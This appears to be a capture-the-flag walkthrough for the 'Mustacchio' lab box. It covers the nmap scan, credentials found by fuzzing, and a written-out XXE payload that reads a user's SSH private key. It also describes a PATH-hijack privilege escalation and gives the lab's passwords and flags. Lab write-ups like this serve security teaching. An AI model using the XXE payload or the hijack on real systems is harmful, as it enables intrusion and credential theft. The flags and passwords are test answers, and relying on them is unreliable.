# MUSTACCHIO

![](../.gitbook/assets/9467a25cbcc84755a81b1cd255efb5b8.png)

## NMAP SCAN

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
```

## FUZZING

![](../.gitbook/assets/4c9c4e03cbbe4c03b03c82bc6a6bc0cf.png)

### /CUSTOM

![](../.gitbook/assets/1f6c7eb103714a19941222f634df1bd8.png)

![](../.gitbook/assets/6c6a0777f6a64cf9b1fa5b13b48c8bd4.png)

![](../.gitbook/assets/5e937240c571438e99d75b405bf2148e.png)

```text
admin:bulldog19
```

## LOGIN

![](../.gitbook/assets/f569132f75a74e4282dc19ea326a19ec.png)

### In VIEW-SOURCE

![](../.gitbook/assets/bb808943b9384de589b9d72b19fe2338.png)

### TEST COMMENT

Something is wrong. We know that the application is using a xml request but the parameters were null.

![](../.gitbook/assets/2b021c64190042a9a2882c8ba304db47.png)

![](../.gitbook/assets/34c74fb2e7bb497b84984475a18a84e5.png)

In code, we see that is an example request in the server.

![](../.gitbook/assets/b6796bd2f8eb48bb976a83ec8ff929c8.png)

Lets see the xml request example

![](../.gitbook/assets/d280dccc139248b09d14676a456bde11.png)

## EXPLOIT XXE

* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection\#detect-the-vulnerability

![](../.gitbook/assets/a9ed523cbbe64a62a216450fbaaf54a8.png)

![](../.gitbook/assets/4b4a4cc714c240eabfd61941ada39c0e.png)

Remember the comment in the page code. Lets try to obtain the id\_rsa of barry to SSH Login.

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:////home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&name;</name>
  <author>myself</author>
  <com>just a comment</com>
</comment>
```

![](../.gitbook/assets/a826c2412892461394bd46ab8ee15de0.png)

The id\_rsa is encrypted. Lets use John the Ripper.

![](../.gitbook/assets/15612c0adfc14a9baf424dc38bbd4211.png)

```text
urieljames
```

### SSH LOGIN

![](../.gitbook/assets/596c3a82e0024754be18c082cb405109.png)

## PRIVESC

### SUID FILES

There´s a SUID file interesting, running by root

![](../.gitbook/assets/54e4be6a088242dbb7e74a1575756488.png)

![](../.gitbook/assets/0d2f6b2d05a94f55a00605e598924c46.png)

When we run this SUID show us the log

![](../.gitbook/assets/e6dc4d67686d4677a477d2eb099a95fb.png)

With strings command, we found out that is calling the tail command without path

![](../.gitbook/assets/e8dd41d921114f198e39420bab319f08.png)

Lets Create a tail binary and add the to our path.

![](../.gitbook/assets/c2ea04d672ce4d628db9dfd721eb8574.png)

When we run the binary, WE BECAME ROOT!! :\)

![](../.gitbook/assets/262954bb135141158056a23189bd2b5c.png)

## FLAGS

### USER.TXT

```text
62d77a4d5f97d47c5aa38b3b2651b831
```

### ROOT.TXT

```text
3223581420d906c4dd1a5f9b530393a5
```

